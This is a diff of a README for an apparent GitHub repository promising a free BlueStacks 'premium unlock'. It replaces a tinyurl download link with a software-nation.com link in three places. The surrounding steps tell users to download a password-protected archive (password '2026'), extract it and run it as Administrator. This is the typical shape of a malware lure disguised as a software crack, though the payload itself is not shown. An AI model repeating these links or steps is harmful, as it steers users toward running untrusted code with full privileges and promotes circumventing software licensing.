@@ -9,7 +9,7 @@ The **📱 BlueStacks** is a **free** premium unlock for the BlueStacks Android 
 
 <div align="center">
 
-[![Download BlueStacks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/bluestacks-free)
+[![Download BlueStacks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/bluestacks-free)
 
 </div>
 
@@ -99,7 +99,7 @@ BlueStacks lets you play mobile games on PC, but premium features are locked. Th
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Click "Unlock" → Restart BlueStacks
 
-[![Download BlueStacks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/bluestacks-free)
+[![Download BlueStacks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/bluestacks-free)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -242,7 +242,7 @@ Get full BlueStacks premium features for free. **BlueStacks** unlocks multi-inst
 
 <div align="center">
 
-[![Download BlueStacks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/bluestacks-free)
+[![Download BlueStacks](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/bluestacks-free)
 
 **Version 4.6.1** — Free BlueStacks premium unlock. April 2026 update. Zero cost. No payment.
 
